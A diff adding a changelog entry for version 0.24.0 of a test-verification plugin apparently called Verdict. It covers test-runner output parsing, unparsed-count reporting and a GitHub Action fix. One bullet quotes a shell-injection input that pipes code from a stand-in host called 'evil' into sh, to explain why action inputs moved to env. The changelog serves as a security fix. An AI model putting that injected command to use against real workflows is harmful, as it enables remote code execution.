@@ -3,6 +3,38 @@
 Plugin and `verdict-mcp` share one version line; `.claude-plugin/plugin.json` and
 `pyproject.toml` are bumped together.
 
+## 0.24.0 — 2026-08-29 · "not just Python, measurably"
+
+Remaining items from the external audit, in value order.
+
+- **Runner dialects.** The count parser only ever spoke pytest, so for Go, Ruby, PHP, .NET
+  and JVM projects the counts came back empty — and *silently*, which meant two of the
+  things Verdict does that a plain test run does not (the "a silent drop in test count is a
+  finding" gate, and the test-id set-diff) simply never fired there. Now twelve dialects,
+  each selected by a signature phrase rather than by ordering, because the vocabularies
+  overlap: `1 failure` is both gotestsum and rspec, `Failures: 1` is both surefire and
+  phpunit, `5 passed` is pytest, cargo, jest and vitest. Read by the wrong dialect the
+  numbers are not so much wrong as incomplete — cargo read as pytest silently drops
+  `ignored`, which is the skip count the gate cares about. Plain `go test` prints no totals
+  at all and is tallied from its `--- PASS:` lines.
+- **Unparsed is now said out loud.** A gate whose summary matched nothing records
+  `counts_unparsed` instead of quietly omitting counts: "the suite reported nothing" and
+  "we failed to understand the suite" are different problems with different fixes. Where a
+  runner reports its own total, that total wins over our arithmetic over its parts — they
+  disagree when a test errors during collection.
+- **`action.yml` no longer splices inputs into shell.** `run-prompt`, `project`, `fail-on`,
+  `findings`, `max-age-hours`, `min-run-number` and `claude-version` now arrive through
+  `env:`. Quoting a `${{ }}` interpolation does not help: the substitution happens before
+  bash parses the line, so an input like `"; curl evil | sh; #` executes. Inputs are
+  workflow-author controlled, but one person wiring `run-prompt` to a PR title turns that
+  into remote code execution.
+- **The README pinned `@v0.6.0`** — fourteen versions stale, so anyone copying the snippet
+  got an ancient gate. Floating `@v0` now.
+- **The scorer no longer calls a team-mode run a modified fixture.** `.qa/` joins the
+  byproduct list: in team mode the QA root lives inside the tree, so a run that wrote its
+  own state looked like a run that edited the code under test.
+- Both READMEs claimed three fixtures and listed six.
+
 ## 0.23.0 — 2026-08-29 · "the enum that was never checked"
 
 An external audit found the worst bug this project has shipped, and it was three days old:
